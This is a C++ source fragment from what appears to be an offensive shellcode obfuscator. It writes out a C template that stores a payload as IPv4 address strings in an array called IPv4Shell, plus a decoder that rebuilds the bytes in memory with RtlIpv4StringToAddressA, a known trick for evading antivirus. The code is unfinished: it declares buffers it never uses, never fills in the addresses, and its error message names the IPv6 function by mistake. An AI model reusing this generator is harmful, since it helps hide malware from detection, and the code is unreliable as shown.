// Header files //
#include "hdrs/io_operations.h"
#include "hdrs/ipv4_obfuscation.h"


void ipv4ObfuscationHandler(ShellcodeStruct& shell_struct) {
    /* Purpose -
     * Parameters:
     * Returns -
     */
    char file_header[256] = "#include <Windows.h>\n"
                            "#include <stdio.h>\n"
                            "#include <Ip2string.h>\n"
                            "#pragma comment(lib, \"Ntdll.lib\")\n\n"
                            "#ifndef NT_SUCCESS\n"
                            "#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n"
                            "#endif\n";
    // Write the header file //
    writeOutputData(shell_struct, file_header);

    char payload_bracket_inner[37] = "\nconst char * IPv4Shell [] = { \n\t";
    // Write the inner bracket of obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_inner);

    char ip_addr[128];


    char payload_bracket_outer[7] = "\n};\n";
    // Write the outer bracket of the obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_outer);


    char shellcode_constants[128];


    char decoder_func[1024] = "BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {\n"
                              "\tPCSTR Terminator = NULL;\n"
                              "\tPVOID LpBaseAddress2 = NULL;\n"
                              "\tNTSTATUS STATUS;\n\tint i = 0;\n"
                              "\tfor (int j = 0; j < ElementsNumber; j++) {\n"
                              "\t\tLpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n"
                              "\t\tSTATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);\n"
                              "\t\tif (!NT_SUCCESS(STATUS)) {\n"
                              "\t\t\tprintf(\"[!] RtlIpv6StringToAddressA failed for %s result %x\", IPV4[j], STATUS);\n"
                              "\t\t\treturn FALSE;\n"
                              "\t\t}\n"
                              "\t\telse {\n"
                              "\t\t\ti = i + 4;\n"
                              "\t\t}\n"
                              "\t}\n"
                              "\treturn TRUE;\n"
                              "}\n";
    // Write the decoder function //
    writeOutputData(shell_struct, decoder_func);
}